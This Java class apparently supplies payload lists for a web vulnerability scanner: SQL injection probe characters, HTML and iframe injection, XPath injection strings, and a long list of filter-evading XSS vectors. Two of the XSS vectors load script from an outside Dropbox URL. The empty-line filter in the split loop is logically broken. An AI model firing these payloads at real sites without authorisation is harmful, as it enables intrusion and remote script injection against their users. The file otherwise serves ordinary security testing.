/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package payload;

import java.util.ArrayList;

/**
 *
 * @author Shaco JX
 */
public class A1p {

    public ArrayList<String> SQLinjection() {
        ArrayList<String> list = new ArrayList<>();
        list.add("'");
        list.add("')");
        list.add("';");
        list.add("\"");
        list.add("\")");
        list.add("\";");
        list.add("%27");
        list.add("%%2727");
        list.add("%25%27");
        list.add("%60");
        list.add("%5C");
        return list;
    }

    public ArrayList<String> HTMLinjection() {
        ArrayList<String> list = new ArrayList<>();
        list.add("<h1>Test</h1>");
        list.add("%3Ch1%3ETest%3C/h1%3E");
        return list;
    }

    public ArrayList<String> XMLXPathInjection() {
        ArrayList<String> list = new ArrayList<>();
        list.add("'");
        list.add("' or '1'='1");
        list.add("' or ''='");
        list.add("x' or 1=1 or 'x'='y");
        list.add("/");
        list.add("//");
        list.add("//*");
        list.add("*/*");
        list.add("@*");
        list.add("count(/child::node())");
        list.add("x' or name()='username' or 'x'='y");
        list.add("' and count(/*)=1 and '1'='1");
        list.add("' and count(/@*)=1 and '1'='1");
        list.add("' and count(/comment())=1 and '1'='1");
        list.add("1][1");
        list.add("last()-1 and 1=2");
        list.add("Bible\" and lower-case('A') = \"a");
        list.add("')]password | a[contains(a,'");
        list.add("') or contains(genre, '");
        list.add("') or not(contains(genre, 'praveen') and '1'='2");
        return list;
    }

    public ArrayList<String> IFrameInjection() {
        ArrayList<String> list = new ArrayList<>();
        list.add("\"><iframe><h1>Low</h1></iframe>");
        list.add("<iframe><h1>Low</h1></iframe>");
        return list;
    }

    //form payload with long payload
    public ArrayList<String> Injection() {
        ArrayList<String> list = new ArrayList<>();
        String pau = "<script>alert(123);</script>\n"
                + "<ScRipT>alert(\"XSS\");</ScRipT>\n"
                + "<script>alert(123)</script>\n"
                + "<script>alert(\"hellox worldss\");</script>\n"
                + "<script>alert(“XSS”)</script> \n"
                + "<script>alert(“XSS”);</script>\n"
                + "<script>alert(‘XSS’)</script>\n"
                + "“><script>alert(“XSS”)</script>\n"
                + "<script>alert(/XSS”)</script>\n"
                + "<script>alert(/XSS/)</script>\n"
                + "</script><script>alert(1)</script>\n"
                + "‘; alert(1);\n"
                + "‘)alert(1);//\n"
                + "alert(1)\n"
                + "<ScRiPt>alert(1)</sCriPt>\n"
                + "<IMG SRC=jAVasCrIPt:alert(‘XSS’)>\n"
                + "<IMG SRC=”javascript:alert(‘XSS’);”>\n"
                + "<IMG SRC=javascript:alert(&quot;XSS&quot;)>\n"
                + "<IMG SRC=javascript:alert(‘XSS’)>      \n"
                + "<img src=xss onerror=alert(1)>\n"
                + "\n"
                + "\n"
                + "<iframe %00 src=\"&Tab;javascript:prompt(1)&Tab;\"%00>\n"
                + "\n"
                + "<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'\n"
                + "\n"
                + "<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\"\n"
                + "\n"
                + "<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}\n"
                + "\n"
                + "<img/src=`%00` onerror=this.onerror=confirm(1)\n"
                + "\n"
                + "<form><isindex formaction=\"javascript&colon;confirm(1)\"\n"
                + "\n"
                + "<img src=`%00`&NewLine; onerror=alert(1)&NewLine;\n"
                + "\n"
                + "<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>\n"
                + "\n"
                + "<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?\n"
                + "\n"
                + "<iframe/src=\"data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">\n"
                + "\n"
                + "<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/\n"
                + "\n"
                + "&#34;&#62;<h1/onmouseover='\\u0061lert(1)'>%00\n"
                + "\n"
                + "<iframe/src=\"data:text/html,<svg &#111;&#110;load=alert(1)>\">\n"
                + "\n"
                + "<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>\n"
                + "\n"
                + "<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script\n"
                + "\n"
                + "<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}\n"
                + "\n"
                + "<meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\">\n"
                + "<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>\n"
                + "\n"
                + "<form><a href=\"javascript:\\u0061lert&#x28;1&#x29;\">X\n"
                + "\n"
                + "</script><img/*%00/src=\"worksinchrome&colon;prompt&#x28;1&#x29;\"/%00*/onerror='eval(src)'>\n"
                + "<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>\n"
                + "<form><iframe &#09;&#10;&#11; src=\"javascript&#58;alert(1)\"&#11;&#10;&#09;;>";
        for(String x : pau.split("\n")){
            if(!x.equals("") || !x.equals(null)){
                list.add(x);
            }
        }
        return list;
    }

}
